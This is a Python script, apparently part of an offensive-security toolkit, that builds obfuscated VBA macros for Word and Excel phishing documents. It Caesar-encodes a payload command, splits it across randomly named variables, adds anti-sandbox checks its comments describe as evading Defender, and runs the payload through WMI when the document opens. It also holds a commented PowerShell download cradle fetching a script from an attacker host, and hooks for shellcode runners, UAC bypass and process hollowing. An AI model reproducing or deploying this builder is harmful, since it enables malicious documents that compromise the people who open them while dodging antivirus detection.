import os,sys
from random import choice
from string import ascii_uppercase
import argparse
from makerunner import gen,runner,cradleps1,powershell_b64encode
from makehtml import copy
from makedll import writedll,cradledll
from makerunspace import makerunspace
from makecompile import makecompile

#lhost = "192.168.135.7"
#lport = "443"
#bitness = "32" #"64"

#doctype = "doc" #"xls" #"doc"
#docfilename = "inject"+"."+doctype #"inject.xls" #"inject.doc" 

#use cmdstring cradle generated from makerunner.py
#cmd = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://"+lhost+"/run.txt'))"
winmgmt = "Winmgmts:"
win32proc = "Win32_Process"

shift = 17

# anti-heuristics - if exclude -> doc 6/26 -defender , xls 6/26 -defender. passes offline defender!!
add_virtualallocexnuma = "1" # 6/26 +defender. also passes offline defender!
add_timelapse = "0" # 7/26 +defender: Trojan:Win32/Phonzy.B!ml

# phishing - switcheroo ("TheDoc"/inject.doc template)
#add_switcheroo = "1" # not necessary - only applicable in real life, and template/word must have "TheDoc"!

# concat - attempt to split long strings, looks like it triggers defender with sadoca
add_concat = "1" 

'''
[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
'''

def caesar(payload):
    #print('[DEBUG 1]')
    #print(payload)
    res = ""
    chars = list(payload)
    for c in chars:
        cres = ord(c) + shift
        cres = str(cres)
        if len(cres) == 1:
            cres = "00" + cres
            res += cres
        elif len(cres) == 2:
            cres = "0" + cres
            res += cres
        elif len(cres) == 3:
            res += cres
    return res
    pass

def rand_12():
    res = (''.join(choice(ascii_uppercase) for i in range(12)))
    res = res.capitalize()
    return res
    pass

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def vba_break(string,length): #+defender with Trojan:O97M/Sadoca.C!ml
    res = ""
    chunks = (string[0+i:length+i] for i in range(0, len(string), length))
    for chunk in chunks:
        res += "\""+chunk+"\""+" & _\n"
    res = res[:-4]
    #print (res)
    return res
    pass

def vba_break2(concat,payload,string,length):
    dim = "    Dim %s As String\n"
    ddim = "    %s = \"%s\"\n"
    cconcat = "    %s = %s(%s,%s)\n" #call vba custom concat func
    cdims = []
    res = []
    chunks = (string[0+i:length+i] for i in range(0, len(string), length))
    for chunk in chunks:
        cdim = rand_word()
        cdims.append(cdim)
        cres = dim % cdim
        cres2 = ddim % (cdim,chunk)
        res.append(cres)
        res.append(cres2)
    #combi = "    %s = %s\n" % (payload," & ".join(cdims))
    combi2 = cconcat % (payload,concat,"\"\"",payload)
    for cdim in cdims:
        combi2 += cconcat % (payload,concat,payload,cdim)
    res.append(combi2)
    #print (res)
    return res
    pass

def write_macro(cmdstring,runspace,compilexml):
    #print('[DEBUG 2]')
    #print(cmdstring)
    # [0] decrypt, [1] param, [2] shift_left, [3] shift_right, [4] res, [5] arrange, [6] payload, [7] clear payload
    varnames = []
    for i in range(13):
        res = rand_word()
        if res not in varnames:
            varnames.append(res)
        else:
            print('[!] woopsie - 1 in a gazillion occurence, same varname generated. terminating. run again!')
            sys.exit()

    #print (var_list)
    decrypt = varnames[0]
    param = varnames[1]
    shift_left = varnames[2]
    shift_right = varnames[3]
    res = varnames[4]
    arrange = varnames[5]
    payload = varnames[6]
    clear_payload = varnames[7]
    mymacro = varnames[8]
    concat = varnames[9]
    param2 = varnames[10]
    myvalues = varnames[11]
    sleep = varnames[12]
    #bitsadmin = varnames[13]
    #certutil = varnames[14]
    #installutil = varnames[15]

    if runspace == "1":
        cmd_runspace = "cmd /c %s" % cmdstring

    if compilexml == "1":
        cmd_compilexml = "cmd /c %s" % cmdstring

    macrofilename = "macro.vbs"
    with open(macrofilename,'w') as f:
        ''' # not needed!
        if runspace == "1":
            f.write("Private Declare Sub Sleep Lib \"kernel32\" (ByVal dwMilliseconds As Long)\n")
        '''
        if add_virtualallocexnuma == "1":
            f.write("Private Declare PtrSafe Function VirtualAllocExNuma Lib \"kernel32\" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long, ByVal nndPreferred As Long) As LongPtr\n")
            f.write("Private Declare PtrSafe Function GetCurrentProcess Lib \"kernel32\" () As LongPtr\n\n")

        if add_timelapse == "1":
            f.write("Private Declare PtrSafe Function Sleep Lib \"kernel32\" (ByVal mili As Long) As Long\n\n")

        if add_switcheroo == "1":
            f.write("Sub Subsub()\n")
            f.write("    ActiveDocument.Content.Select\n")
            f.write("    Selection.Delete\n")
            f.write("    ActiveDocument.AttachedTemplate.AutoTextEntries(\"TheDoc\").Insert Where:=Selection.Range, RichText:=True\n")
            f.write("End Sub\n\n")

        ''' # not needed!
        if runspace == "1":
            f.write("Function %s(%s)\n" % (sleep,"bedtime"))
            f.write("    Sleep bedtime\n")
            f.write("End Function\n\n")
        '''

        # concat
        if add_concat == "1":
            f.write("Function %s(%s,%s)\n" % (concat,param,param2))
            f.write("    Dim %s As Variant\n" % (myvalues))
            f.write("    %s = Array(%s,%s)\n" % (myvalues,param,param2))
            f.write("    %s = Join(%s,\"\")\n" % (concat,myvalues))
            #f.write("    %s = %s & %s\n" % (concat,param,param2)) #simpler way
            f.write("End Function\n\n")
        # caesar decryptor
        f.write("Function %s(%s)\n" % (decrypt,param))
        f.write("    %s = Chr(%s - %s)\n" % (decrypt,param,str(shift)))
        f.write("End Function\n\n")
        # left
        f.write("Function %s(%s)\n" % (shift_left,param))
        f.write("    %s = Left(%s, 3)\n" % (shift_left,param))
        f.write("End Function\n\n")
        # right
        f.write("Function %s(%s)\n" % (shift_right,param))
        f.write("    %s = Right(%s, Len(%s) - 3)\n" % (shift_right,param,param))
        f.write("End Function\n\n")
        # arrange
        f.write("Function %s(%s)\n" % (arrange,param))
        f.write("    Do\n")
        f.write("    %s = %s + %s(%s(%s))\n" % (res,res,decrypt,shift_left,param))
        f.write("    %s = %s(%s)\n" % (param,shift_right,param))
        f.write("    Loop While Len(%s) > 0\n" % (param))
        f.write("    %s = %s\n" % (arrange,res))
        f.write("End Function\n\n")
        # mymacro
        f.write("Function %s\n" % mymacro)

        if add_virtualallocexnuma == "1":
            f.write("    Dim vaddr As LongPtr\n")
            f.write("    Dim proc As LongPtr\n")
            f.write("    proc = GetCurrentProcess()\n")
            f.write("    vaddr = VirtualAllocExNuma(proc, 0, &H1000, &H3000, &H40, 0)\n")
            f.write("    If vaddr = 0 Then\n")
            f.write("        Exit Function\n")
            f.write("    End If\n")

        if add_timelapse == "1":
            f.write("    Dim manny1 As Date\n")
            f.write("    Dim manny2 As Date\n")
            f.write("    Dim granny As Long\n")
            f.write("    manny1 = Now()\n")
            f.write("    Sleep (7000)\n")
            f.write("    manny2 = Now()\n")
            f.write("    granny = DateDiff(\"s\", manny1, manny2)\n")
            f.write("    If granny < 2 Then\n")
            f.write("        Exit Function\n")
            f.write("    End If\n")

        if doctype == "doc":
            f.write("    If ActiveDocument.Name <> %s(\"%s\") Then\n" % (arrange,caesar(docfilename)))
        if doctype == "xls":
            f.write("    If ThisWorkbook.Name <> %s(\"%s\") Then\n" % (arrange,caesar(docfilename)))
        f.write("        Exit Function\n")
        f.write("    End If\n")
        f.write("    Dim %s As String\n" % payload)
        f.write("    Dim %s As String\n" % clear_payload)
        if runspace == "0" and compilexml == "0":
            #f.write("    %s = \"%s\"\n" % (payload,caesar(cmdstring)))
            for chunk in vba_break2(concat,payload,caesar(cmdstring),900): f.write(chunk)
            #f.write("    %s = %s\n" % (payload,vba_break(caesar(cmdstring),900)))
        if runspace == "1":
            for chunk in vba_break2(concat,payload,caesar(cmd_runspace),900): f.write(chunk)
        if compilexml == "1":
            for chunk in vba_break2(concat,payload,caesar(cmd_compilexml),900): f.write(chunk)
        f.write("    %s = %s(%s)\n" % (clear_payload,arrange,payload))
        f.write("    GetObject(%s(\"%s\")).Get(%s(\"%s\")).Create %s,%s,%s,%s\n" % (arrange,caesar(winmgmt),arrange,caesar(win32proc),clear_payload,rand_word(),rand_word(),rand_word()))
        f.write("End Function\n\n")
        # docopen, autoopen
        if doctype == "doc":
            f.write("Sub Document_Open()\n")
        if doctype == "xls":
            f.write("Sub Workbook_Open()\n")
            #add_switcheroo = 0
        if add_switcheroo == "1":
            f.write("    Subsub\n")
        f.write("    %s\n" % mymacro)
        f.write("End Sub\n\n")

        f.write("Sub AutoOpen()\n")        
        if add_switcheroo == "1":
            f.write("    Subsub\n")
        f.write("    %s\n" % mymacro)
        f.write("End Sub\n\n")
    f.close()

    print('[*] %s macro for %s written: %s' % (doctype.upper(),docfilename,macrofilename))

    shared_folder = "/home/kali/data/Tools/office/"
    copy(macrofilename,shared_folder,macrofilename)
    #os.system("cp %s %s" % (macrofilename,shared_folder))
    #print('[+] copied %s to %s' % (macrofilename,shared_folder))
    print('[*] enable editing only before pasting macro in')
    if doctype == "xls":
        print('[*] for XLS - remember to copy into ThisWorkbook')
    pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--type','-t',required=True,dest='doctype',help='doc or xls')
    parser.add_argument('--fname','-f',required=True,dest='docfilename',help='docfilename')
    parser.add_argument('--ptype','-d',required=True,dest='ptype',help='ps1/dll for regular or runspace,dir/bin for compilexml')
    parser.add_argument('--uac','-u',required=False,dest='uacbypass',help='uacbypass 0 or 1, only use with dll!')
    parser.add_argument('--runspace','-r',required=False,dest='runspace',help='runspace 0 or 1')
    #parser.add_argument('--compile','-c',required=False,dest='compilexml',help='compile 0 or 1')
    parser.add_argument('--binary','-b',required=False,dest='binary',help='Hollow, UACHelper, or PipePipe')
    parser.add_argument('--target','-n',required=False,dest='targethost',help='target hostname, e.g. rdc01') # default: [TARGETHOST]
    parser.add_argument('--hostname','-m',required=False,dest='listenhost',help='listening hostname, e.g. app01') # default: [LISTENHOST]
    parser.add_argument('--pipe','-s',required=False,dest='pipename',help='any arbitrary pipe name that targets \\pipe\\spoolss, e.g. \\\\.\\pipe\\test\\pipe\\spoolss') # default: \\\\.\\pipe\\test\\pipe\\spoolss

    args = parser.parse_args()
    
    bitness = args.arch # bitness can be "64" even if office is 32-bit - this process separates from office and depends on os architecture
    lhost = args.host
    lport = args.port
    doctype = args.doctype #"doc" #"xls" #"doc"
    docfilename = args.docfilename+"."+doctype #"inject.xls" #"inject.doc" 
    ptype = args.ptype
    uacbypass = args.uacbypass
    runspace = args.runspace
    binary = args.binary
    targethost = args.targethost
    listenhost = args.listenhost
    pipename = args.pipename

    if doctype == "xls":
        add_switcheroo = "0"
    if doctype == "doc":
        add_switcheroo = "0" #looks like doesn't work if word doesn't have our autotext set anyway # if "1" must use inject.doc as base cos of "TheDoc" AutoText

    if uacbypass == None:
        uacbypass = "0"
    if runspace == None:
        runspace = "0"
    if binary == None:
        binary = "0"
    if targethost == None:
        targethost = "0"
    if listenhost == None:
        listenhost = "0"
    if pipename == None:
        pipename = "0"

    compilexml = "0"
    if ptype == "dir" or ptype == "bin":
        compilexml = "1"
    if compilexml == "1" and binary == "0":
        print('[!] binary must be provided for %s ptype! choose Hollow or UACHelper. terminating!' % ptype)
        sys.exit()

    if uacbypass == "1" and ptype != "dll":
        print ("[!] uacbypass not compatible with %s! turning off uacbypass" % ptype)
        uacbypass = "0"

    if runspace == "0" and compilexml == "0":
        if ptype == "ps1":
            runnerfilename = runner(lhost,lport,bitness)
            fullcradle,cradle = cradleps1(lhost,runnerfilename)
            cmdstring = fullcradle
        if ptype == "dll":
            dllwebroot = "/var/www/html/"
            dllfilename = "ClassLibrary1.dll"
            dllcsfilepath = "/home/kali/data/ClassLibrary1/ClassLibrary1/"
            dllcsfilename = "Class1.cs"

            if uacbypass == "0":
                gen(lhost,lport,bitness,"csharp")
            if uacbypass == "1":
                runner(lhost,lport,bitness)
            csfilename = writedll(lhost,lport,bitness,uacbypass)
            copy(csfilename,dllcsfilepath,dllcsfilename)
            input("[!] compile %s with bitness %s .. press enter to continue\n" % (dllcsfilename,bitness))
            if bitness == "64":
                copy("%sbin/x64/Release/%s" % (dllcsfilepath,dllfilename),dllwebroot,dllfilename)
            if bitness == "32":
                copy("%sbin/x86/Release/%s" % (dllcsfilepath,dllfilename),dllwebroot,dllfilename)
            fullcradle,cradle = cradledll(lhost,dllfilename)
            cmdstring = fullcradle
            #print('[DEBUG 3]')
            #print(cmdstring)
    if runspace == "1":
        if binary != "0":
                print('[!] makemacro with runspace/installutil and -b binary not yet implemented! terminating!')
                sys.exit()
                pass 
        else:
            pscmd = "0" #None
            direct = "0"
            combo,combosub = makerunspace(bitness,lhost,lport,ptype,uacbypass,direct,pscmd,binary,targethost,listenhost,pipename)
            cmdstring = combosub
            #cmdstring = "bitsadmin /Transfer myJob http://192.168.135.7/file.txt c:\\windows\\tasks\\file.txt"
            #print('[DEBUG] cmdstring:\n%s' % cmdstring)
    if compilexml == "1":
        combo,combosub = makecompile(bitness,lhost,lport,ptype,binary,targethost,listenhost,pipename,"0")
        cmdstring = combosub

    write_macro(cmdstring,runspace,compilexml)